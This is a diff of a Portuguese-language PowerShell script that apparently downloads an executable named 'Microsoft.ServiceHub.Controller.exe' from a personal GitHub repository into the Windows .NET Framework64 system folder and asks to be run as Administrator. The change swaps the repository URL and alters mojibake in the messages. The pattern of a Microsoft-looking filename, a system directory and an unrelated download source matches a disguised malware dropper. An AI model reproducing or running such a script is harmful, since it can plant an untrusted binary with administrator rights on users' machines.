@@ -1,9 +1,9 @@
 $diretorio = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319"
-$url = "https://github.com/Spectreghost2k/forfunsrnadom/raw/refs/heads/main/Microsoft.ServiceHub.Controller.exe"
+$url = "https://github.com/Spectreghost2k/speczumsas/raw/refs/heads/main/Microsoft.ServiceHub.Controller.exe"
 $caminhoArquivo = Join-Path -Path $diretorio -ChildPath "Microsoft.ServiceHub.Controller.exe"
 
 if (-not (Test-Path -Path $diretorio)) {
-    Write-Host "DiretÛrio n„o encontrado ou n„o È acessÌvel. Certifique-se de executar o PowerShell como Administrador."
+    Write-Host "Diret√≥rio n√£o encontrado ou n√£o √© acess√≠vel. Certifique-se de executar o PowerShell como Administrador."
     exit
 }
 
